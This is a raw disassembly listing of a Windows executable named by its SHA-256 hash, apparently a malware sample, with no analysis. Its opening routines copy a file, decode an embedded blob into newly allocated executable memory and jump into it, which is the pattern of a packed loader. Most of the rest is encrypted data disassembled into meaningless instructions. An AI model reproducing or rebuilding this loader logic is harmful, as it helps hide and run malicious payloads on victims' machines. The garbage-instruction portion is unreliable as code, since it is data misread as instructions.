
346e1545c0c93deae407fd5553da34fb0e00987179529f9edebe4085b85e2180.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0x6aeda22f
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	pushf  
  41145b:	dec    esi
  41145c:	sub    DWORD PTR [ebp+0x25b2a1f6],edx
  411462:	call   0x861b:0x2f2e8de0
  411469:	and    BYTE PTR [esi-0x59],ch
  41146c:	fisttp DWORD PTR [edx-0x42]
  41146f:	mov    al,0xea
  411471:	ins    DWORD PTR es:[edi],dx
  411472:	and    eax,0xfac080aa
  411477:	loope  0x4114d8
  411479:	sbb    dl,BYTE PTR [edi+0x7e]
  41147c:	enter  0xe94f,0xb4
  411480:	push   ebp
  411481:	pop    edi
  411482:	mov    cl,0xd3
  411484:	inc    edx
  411485:	pop    ebx
  411486:	dec    ebp
  411487:	xor    BYTE PTR [ecx-0x49],bh
  41148a:	aas    
  41148b:	rol    BYTE PTR [esi+0xf],0xab
  41148f:	in     al,dx
  411490:	cwde   
  411491:	or     eax,0xcbe9bb59
  411496:	push   ss
  411497:	fdivrp st(6),st
  411499:	fmul   DWORD PTR [edx+0x35c92ca3]
  41149f:	test   al,0x5c
  4114a1:	jbe    0x41146c
  4114a3:	dec    eax
  4114a4:	fsubr  st(0),st
  4114a6:	xor    eax,0x9a443770
  4114ab:	rcl    DWORD PTR [esi+0x52],cl
  4114ae:	out    0x79,eax
  4114b0:	add    dl,BYTE PTR [ebx]
  4114b2:	ins    BYTE PTR es:[edi],dx
  4114b3:	fsub   DWORD PTR [esi-0x71be7b80]
  4114b9:	sbb    DWORD PTR [esi+edi*8],esp
  4114bc:	imul   ecx,DWORD PTR [eax+0x31],0xcf066ea
  4114c3:	sbb    DWORD PTR [ecx-0x27],esi
  4114c6:	xchg   esp,eax
  4114c7:	test   BYTE PTR gs:[esi],bh
  4114ca:	push   eax
  4114cb:	xor    al,0x6b
  4114cd:	fistp  DWORD PTR [ebx+0x7b8c2336]
  4114d3:	(bad)  
  4114d4:	bnd jns 0x4114f9
  4114d7:	hlt    
  4114d8:	lds    esp,FWORD PTR [ecx-0x17ec2fc1]
  4114de:	popf   
  4114df:	cmp    bl,BYTE PTR [ecx+0x39]
  4114e2:	inc    esp
  4114e3:	inc    esi
  4114e4:	rcl    BYTE PTR [eax],1
  4114e6:	cmp    al,0xd
  4114e8:	pop    ds
  4114e9:	(bad)  
  4114ea:	mov    ecx,0xa94ac039
  4114ef:	pop    edx
  4114f0:	mov    dh,BYTE PTR cs:[esi-0x64]
  4114f4:	loope  0x4114ad
  4114f6:	cmp    BYTE PTR fs:[edi],0x24
  4114fa:	jo     0x411565
  4114fc:	arpl   WORD PTR [eax+0x3797f150],di
  411502:	dec    esi
  411503:	or     DWORD PTR [edi-0x7e],ebp
  411506:	jg     0x411532
  411508:	dec    esp
  411509:	pop    es
  41150a:	nop
  41150b:	mov    edi,0xc06fb000
  411510:	mov    edx,0x8af9d38b
  411515:	sar    BYTE PTR [edi+eiz*2],1
  411518:	je     0x411566
  41151a:	cdq    
  41151b:	pop    ebx
  41151c:	sub    eax,0x141107c7
  411521:	add    DWORD PTR [ebp+0x51],esi
  411524:	(bad)  
  411525:	sbb    esp,ebp
  411527:	or     dl,ch
  411529:	cld    
  41152a:	in     eax,dx
  41152b:	cmp    ecx,edi
  41152d:	pop    eax
  41152e:	int    0x1e
  411530:	out    dx,eax
  411531:	dec    ebp
  411532:	jmp    0xca51:0xb5bdbaf6
  411539:	jmp    0xf821c6b3
  41153e:	xchg   ebp,eax
  41153f:	enter  0x439f,0x5e
  411543:	xchg   ebp,eax
  411544:	pop    edi
  411545:	dec    ebp
  411546:	je     0x41155f
  411548:	outs   dx,DWORD PTR ds:[esi]
  411549:	push   ss
  41154a:	xor    al,0xaa
  41154c:	les    ecx,FWORD PTR ds:0x70be4a94
  411552:	xchg   edi,eax
  411553:	or     DWORD PTR [ebp-0x7a],esi
  411556:	push   cs
  411557:	jmp    0x5236:0x4d564cb9
  41155e:	mov    al,0xf6
  411560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411561:	xor    ebx,DWORD PTR [esi-0x34]
  411564:	adc    BYTE PTR [edx],ah
  411566:	jmp    FWORD PTR [esi]
  411568:	in     al,0xfe
  41156a:	mov    bh,0x38
  41156c:	cli    
  41156d:	xlat   BYTE PTR ds:[ebx]
  41156e:	dec    eax
  41156f:	mov    DWORD PTR [edx+0x3ac175c8],edx
  411575:	or     edi,DWORD PTR [edi-0x39f50341]
  41157b:	fbstp  TBYTE PTR [ebx+0x7637a4b0]
  411581:	(bad)  
  411582:	or     eax,0xfbe60f86
  411587:	jmp    0xbbca:0xdf2ca654
  41158e:	cwde   
  41158f:	push   eax
  411590:	mov    ecx,0xa75574f1
  411595:	ss in  al,0x31
  411598:	ja     0x411556
  41159a:	inc    esp
  41159b:	cmp    bh,BYTE PTR [ebx+ebx*4]
  41159e:	and    eax,0xc86ca902
  4115a3:	jne    0x4115f0
  4115a5:	push   ds
  4115a6:	sbb    BYTE PTR [edx+edx*8+0xc8c18e0],ah
  4115ad:	cmp    ecx,DWORD PTR [ebx+0x65]
  4115b0:	je     0x411576
  4115b2:	cmp    DWORD PTR [eax-0x32],ecx
  4115b5:	or     DWORD PTR [esi-0x3afe50e9],ecx
  4115bb:	pop    ebp
  4115bc:	sub    BYTE PTR [ebx],ch
  4115be:	shl    BYTE PTR [esi-0x70e46c17],0x93
  4115c5:	sub    bh,BYTE PTR [ebx+0x701ad7cc]
  4115cb:	mov    esi,0x33f405c8
  4115d0:	addr16 es push ecx
  4115d3:	out    dx,eax
  4115d4:	mov    bh,al
  4115d6:	pop    ss
  4115d7:	add    ebx,DWORD PTR [esi]
  4115d9:	cmp    al,0x4e
  4115db:	stos   DWORD PTR es:[edi],eax
  4115dc:	in     eax,0x4a
  4115de:	sub    BYTE PTR [esp+ecx*4-0x551eae7e],bh
  4115e5:	cmp    ebp,0x77acc616
  4115eb:	rcl    DWORD PTR [ecx-0x39],cl
  4115ee:	in     al,0x67
  4115f0:	mov    WORD PTR [edx],?
  4115f2:	adc    dl,BYTE PTR [esi+0x23]
  4115f5:	mov    ch,0x92
  4115f7:	push   ebx
  4115f8:	mov    dh,0x55
  4115fa:	fbstp  TBYTE PTR [ebp+eax*1-0x6b076c50]
  411601:	cmp    edx,ebx
  411603:	mov    esi,0x52848bee
  411608:	lahf   
  411609:	inc    eax
  41160a:	or     dl,BYTE PTR [eax+0x52ec8bb5]
  411610:	adc    dh,BYTE PTR [ebp+0x35344dc6]
  411616:	(bad)  
  411617:	cmp    DWORD PTR [eax-0x62],edx
  41161a:	adc    edi,DWORD PTR [edi+eax*4]
  41161d:	jae    0x4115e8
  41161f:	sbb    DWORD PTR [ecx+edx*2],0xebec6933
  411626:	lock xor edx,ecx
  411629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41162a:	inc    esi
  41162b:	mov    ecx,0xd74ffb0b
  411630:	xor    BYTE PTR [ebp-0x3957f8ec],bl
  411636:	imul   ebp,ebx,0x94b6f9a
  41163c:	add    al,0xc
  41163e:	ins    DWORD PTR es:[edi],dx
  41163f:	mov    al,ds:0xe2fabf4
  411644:	(bad)  
  411645:	fcom   st(5)
  411647:	sub    eax,0xb3f3f88d
  41164c:	pop    es
  41164d:	in     al,dx
  41164e:	xchg   ecx,eax
  41164f:	xchg   DWORD PTR [ecx+0x7c9853e1],esp
  411655:	dec    eax
  411656:	in     eax,dx
  411657:	out    0x47,al
  411659:	or     cl,al
  41165b:	(bad)  
  41165d:	sub    DWORD PTR ds:0x11362b29,esi
  411663:	pop    edi
  411664:	imul   eax,edi,0xdb2ca503
  41166a:	inc    eax
  41166b:	(bad)  
  41166c:	fld    st(6)
  41166e:	int3   
  41166f:	and    edx,DWORD PTR [ebx-0x9fa4556]
  411675:	mov    bl,0x94
  411677:	pop    edi
  411678:	lea    esi,[edi]
  41167a:	test   DWORD PTR [edi-0x4210cff4],ecx
  411680:	push   ebp
  411681:	push   eax
  411682:	push   eax
  411683:	push   eax
  411684:	outs   dx,DWORD PTR ds:[esi]
  411685:	jnp    0x41166e
  411687:	(bad)  
  411688:	addr16 xchg esp,eax
  41168a:	xchg   esi,eax
  41168b:	mov    dl,0x30
  41168d:	mov    cl,0x74
  41168f:	cmp    al,0x59
  411691:	aaa    
  411692:	adc    al,0x13
  411694:	or     eax,0xfaf6c2aa
  411699:	cmp    DWORD PTR [edx],edx
  41169b:	(bad)  
  41169c:	fwait
  41169d:	in     eax,0x5a
  41169f:	mov    ecx,0x199ca5e0
  4116a4:	mov    bh,0xd
  4116a6:	icebp  
  4116a7:	fnstenv [esi]
  4116a9:	xor    al,0x70
  4116ab:	add    bl,BYTE PTR [ecx-0xb]
  4116ae:	cs loop 0x41169f
  4116b1:	std    
  4116b2:	into   
  4116b3:	and    DWORD PTR [eax+edx*8+0x493fb541],0x53
  4116bb:	xchg   edx,esp
  4116bd:	das    
  4116be:	mov    ?,WORD PTR [esi+0x57]
  4116c1:	ror    DWORD PTR [edi],0xb0
  4116c4:	aam    0xf3
  4116c6:	out    0xdf,eax
  4116c8:	mov    ds:0xb498283f,eax
  4116cd:	sbb    BYTE PTR ds:0xc2d97d2a,0xfd
  4116d4:	sub    eax,0x179354b1
  4116d9:	xor    ax,WORD PTR [edi-0x5f549689]
  4116e0:	pop    eax
  4116e1:	push   cs
  4116e2:	xchg   DWORD PTR [eax-0x9],ebp
  4116e5:	cs jno 0x411734
  4116e8:	ja     0x4116e2
  4116ea:	int3   
  4116eb:	pop    eax
  4116ec:	inc    edx
  4116ed:	sbb    ebx,DWORD PTR [edi]
  4116ef:	sbb    ah,BYTE PTR [ecx+0x59a730c8]
  4116f5:	scas   eax,DWORD PTR es:[edi]
  4116f6:	jbe    0x411756
  4116f8:	and    BYTE PTR gs:[ecx-0x5c],bl
  4116fc:	rcl    dh,1
  4116fe:	clc    
  4116ff:	mov    ebp,0x410e476f
  411704:	test   DWORD PTR [edx+0xbe7dc9b],ebx
  41170a:	sbb    BYTE PTR [ebx],0xb5
  41170d:	add    edi,ebx
  41170f:	lods   al,BYTE PTR fs:[esi]
  411711:	mov    esp,0x8741b0a3
  411716:	mov    al,ds:0xce0cb5ad
  41171b:	in     al,0xf5
  41171d:	adc    BYTE PTR [esi],al
  41171f:	jle    0x411751
  411721:	add    dl,BYTE PTR [ebx]
  411723:	push   esp
  411724:	or     WORD PTR [eax-0x2f],cx
  411728:	(bad)  
  411729:	xor    DWORD PTR [edi-0x64],ebp
  41172c:	ds xchg ebx,eax
  41172f:	loope  0x411740
  411731:	das    
  411732:	js     0x411716
  411734:	dec    edi
  411735:	mov    ?,esi
  411737:	pop    ss
  411738:	lods   al,BYTE PTR ds:[esi]
  411739:	jne    0x4116d9
  41173b:	pusha  
  41173c:	into   
  41173d:	int    0x68
  41173f:	pop    ebp
  411740:	xor    cl,BYTE PTR [ecx+0x5173685d]
  411746:	daa    
  411747:	popf   
  411748:	lahf   
  411749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41174a:	das    
  41174b:	pop    ebx
  41174c:	and    eax,0xde9ea329
  411751:	xchg   DWORD PTR [eax+ebp*1-0x1e1698fc],edx
  411758:	add    dl,dl
  41175a:	pop    edx
  41175b:	(bad)  
  41175c:	xor    BYTE PTR [ebx-0x7bb2197a],dh
  411762:	jp     0x411753
  411764:	mov    ss,WORD PTR [ebx]
  411766:	push   0xbf798e30
  41176b:	push   ds
  41176c:	adc    eax,0xe8e51965
  411771:	bound  ebp,QWORD PTR [edi-0x2d9fef74]
  411777:	call   0x81ee:0x6fb6ba12
  41177e:	aam    0x9a
  411780:	lods   al,BYTE PTR ds:[esi]
  411781:	lock mov esp,0xb5bde8e
  411787:	push   edi
  411788:	xor    ch,BYTE PTR [edx]
  41178a:	add    dl,BYTE PTR [edi]
  41178c:	aad    0xce
  41178e:	nop
  41178f:	ficomp DWORD PTR [edi+0x3d706e6e]
  411795:	loopne 0x4117ef
  411797:	xchg   ebx,eax
  411798:	ret    0x4ec3
  41179b:	mov    ah,0x98
  41179d:	jns    0x41174f
  41179f:	ja     0x41176a
  4117a1:	(bad)  
  4117a2:	xchg   ebx,eax
  4117a3:	pop    ds
  4117a4:	hlt    
  4117a5:	xor    BYTE PTR [esi+edx*4-0x5e],ch
  4117a9:	aas    
  4117aa:	mov    ebx,0x3f8ea8ee
  4117af:	xchg   esp,eax
  4117b0:	sar    bh,0xcc
  4117b3:	adc    eax,DWORD PTR [edx+0x1d68cae9]
  4117b9:	lock ss or eax,0xd65cb121
  4117c0:	js     0x41177e
  4117c2:	xchg   esi,eax
  4117c3:	mov    ch,0x76
  4117c5:	adc    eax,edx
  4117c7:	pop    ecx
  4117c8:	add    BYTE PTR [ebx+eax*2],bl
  4117cb:	cmp    BYTE PTR ds:[esi+0x697eccd5],ah
  4117d2:	fsub   QWORD PTR [edi]
  4117d4:	mov    ebx,0xef10fb57
  4117d9:	push   ebx
  4117da:	sbb    eax,0xba6995d6
  4117df:	sub    dl,BYTE PTR [ebx+0x20]
  4117e2:	xchg   esp,eax
  4117e3:	scas   al,BYTE PTR es:[edi]
  4117e4:	cmp    BYTE PTR [edi+ecx*4-0x28],dl
  4117e8:	les    edx,FWORD PTR [esi+edi*4+0x7]
  4117ec:	dec    esp
  4117ed:	inc    eax
  4117ee:	repnz sbb ch,bl
  4117f1:	mov    esp,0xe0f26e67
  4117f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f7:	mov    al,0xfc
  4117f9:	xchg   BYTE PTR [esi+0x413278fd],ch
  4117ff:	cli    
  411800:	push   esi
  411801:	dec    esi
  411802:	sub    cl,BYTE PTR [ebx+0x24]
  411805:	scas   al,BYTE PTR es:[edi]
  411806:	hlt    
  411807:	inc    edi
  411808:	(bad)  
  411809:	sbb    BYTE PTR [eax],bh
  41180b:	and    BYTE PTR [edi+esi*2+0x58f6375],ch
  411812:	sbb    al,0x3c
  411814:	fnstcw WORD PTR [ebx+0x2d]
  411817:	iret   
  411818:	pop    edi
  411819:	cmp    al,0x18
  41181b:	fucomi st,st(4)
  41181d:	icebp  
  41181e:	rol    BYTE PTR [ebx-0x10bd193a],cl
  411824:	cli    
  411825:	mov    ds:0xfef72a2d,eax
  41182a:	dec    ecx
  41182b:	sahf   
  41182c:	imul   ebp,DWORD PTR [edi+0x695d3e8f],0x37
  411833:	mov    eax,0x6d981fe7
  411838:	repz call 0xd006:0xa4c1264a
  411840:	push   edi
  411841:	pop    esi
  411842:	inc    edx
  411843:	lods   al,BYTE PTR ds:[esi]
  411844:	aas    
  411845:	mov    ebp,DWORD PTR [ebp-0x6f55abb3]
  41184b:	imul   ecx,esi,0x43cdde12
  411851:	push   edi
  411852:	in     eax,dx
  411853:	inc    esp
  411854:	mov    edi,0x5dc653ff
  411859:	mov    ah,0x5d
  41185b:	cwde   
  41185c:	push   edx
  41185d:	(bad)  
  41185e:	jmp    0x93593fc
  411863:	int3   
  411864:	fyl2xp1 
  411866:	mov    al,0x8d
  411868:	pushf  
  411869:	not    DWORD PTR [ecx]
  41186b:	xlat   BYTE PTR ds:[ebx]
  41186c:	fs push esi
  41186e:	mov    edi,0xb0c37614
  411873:	in     ax,0xab
  411876:	aaa    
  411877:	mov    ss,WORD PTR [esi+edx*8+0x19ae85b1]
  41187e:	sti    
  41187f:	das    
  411880:	mov    edi,gs
  411882:	fmul   DWORD PTR [ebx+ebx*4-0x7bd4c73f]
  411889:	mov    eax,0x9002ba23
  41188e:	jo     0x4118bb
  411890:	(bad)  
  411891:	mov    WORD PTR [edi-0x5cc1b63c],gs
  411897:	push   cs
  411898:	mov    ah,dh
  41189a:	sar    BYTE PTR [edi],1
  41189c:	mul    DWORD PTR [edx+edi*8-0x69b4f33d]
  4118a3:	sbb    cl,ch
  4118a5:	inc    esi
  4118a6:	inc    eax
  4118a7:	mov    edx,0x7f9f7d77
  4118ac:	jae    0x41192a
  4118ae:	fst    QWORD PTR [edx]
  4118b0:	xor    eax,0xc28b79c6
  4118b5:	pop    ebx
  4118b6:	ror    DWORD PTR [ebx-0x2],0x41
  4118ba:	std    
  4118bb:	xchg   edx,eax
  4118bc:	jle    0x411875
  4118be:	or     DWORD PTR [ebp+ecx*2+0x58],esp
  4118c2:	mov    bh,0x39
  4118c4:	nop
  4118c5:	mov    cl,0xf9
  4118c7:	mov    eax,es
  4118c9:	xchg   BYTE PTR [edx-0x157d11cb],dl
  4118cf:	mov    ecx,0xd300c638
